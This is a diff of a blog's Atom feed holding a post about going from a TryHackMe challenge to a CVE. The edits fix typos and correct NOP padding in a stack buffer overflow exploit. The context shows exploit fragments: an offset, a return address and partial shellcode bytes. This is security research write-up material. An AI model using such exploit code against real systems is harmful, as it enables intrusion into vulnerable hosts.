@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>OmegaVoid - Blog of Many Things</title><link href="/" rel="alternate"></link><link href="/feeds/all-en.atom.xml" rel="self"></link><id>/</id><updated>2021-05-06T12:00:00+01:00</updated><subtitle>Blog of Many Things</subtitle><entry><title>Down the Jellyfish Hole</title><link href="/down-the-jellyfish-hole.html" rel="alternate"></link><published>2021-05-06T12:00:00+01:00</published><updated>2021-05-06T12:00:00+01:00</updated><author><name>OmegaVoid</name></author><id>tag:None,2021-05-06:/down-the-jellyfish-hole.html</id><summary type="html">&lt;p&gt;Sometimes rabbit holes aren't a bad thing. The story of how I went to do a Challenge on TryHackMe and came out with a CVE on the other side.&lt;/p&gt;</summary><content type="html">&lt;blockquote&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>OmegaVoid - Blog of Many Things</title><link href="/" rel="alternate"></link><link href="/feeds/all-en.atom.xml" rel="self"></link><id>/</id><updated>2021-05-06T12:00:00+01:00</updated><subtitle>Blog of Many Things</subtitle><subtitle>Blog of Many Things</subtitle><entry><title>Down the Jellyfish Hole</title><link href="/down-the-jellyfish-hole.html" rel="alternate"></link><published>2021-05-06T12:00:00+01:00</published><updated>2021-05-06T12:00:00+01:00</updated><author><name>OmegaVoid</name></author><id>tag:None,2021-05-06:/down-the-jellyfish-hole.html</id><summary type="html">&lt;p&gt;Sometimes rabbit holes aren't a bad thing. The story of how I went to do a Challenge on TryHackMe and came out with a CVE on the other side.&lt;/p&gt;</summary><content type="html">&lt;blockquote&gt;
 &lt;p&gt;Note: This post is not a write up of Year of the Jellyfish, but it does contain spoilers. Continue reading at your own risk.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2&gt;Year of the Jellyfish&lt;/h2&gt;
@@ -183,7 +183,7 @@ I searched around a bit and found: &lt;a href="https://nvd.nist.gov/vuln/detail/
 &lt;p&gt;So let's do this. We'll launch our binary on Immunity Debugger and execute it.&lt;/p&gt;
 &lt;p&gt;Remember to reset the binary anytime it crashes.&lt;/p&gt;
 &lt;h3&gt;Writing code to interact with the Application and Fuzzing&lt;/h3&gt;
-&lt;p&gt;First of all one thing we need to do is figure out if and here an application is vulnerable. There are two ways to do this, a White Box approach and a Black Box approach.&lt;/p&gt;
+&lt;p&gt;First of all one thing we need to do is figure out if and where an application is vulnerable. There are two ways to do this, a White Box approach and a Black Box approach.&lt;/p&gt;
 &lt;p&gt;In a White Box approach you'd analyze the binary (or the source code) for functions you know are vulnerable to stack buffer overflows.&lt;/p&gt;
 &lt;p&gt;In a Black Box approach you feed normal input to the application and see the application behaviour, and then feed it an extremely long input and see if the application crashes.&lt;/p&gt;
 &lt;p&gt;If it crashes with a really long input, and we know it's a binary running, there's a good chance there's a Buffer Overflow there.&lt;/p&gt;
@@ -368,7 +368,7 @@ Trust your debugger.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2026&lt;/span&gt;
 &lt;span class="n"&gt;overflow&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;
 &lt;span class="n"&gt;EIP&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xaf\x11\x50\x62&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
-&lt;span class="n"&gt;padding&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;x90&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;
+&lt;span class="n"&gt;padding&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;
 &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
 &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xb8\xbd\xf9\x81\x1a\xdb\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
 &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x52\x83\xee\xfc\x31\x46\x0e\x03\xfb\xf7\x63\xef\xff\xe0\xe6&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
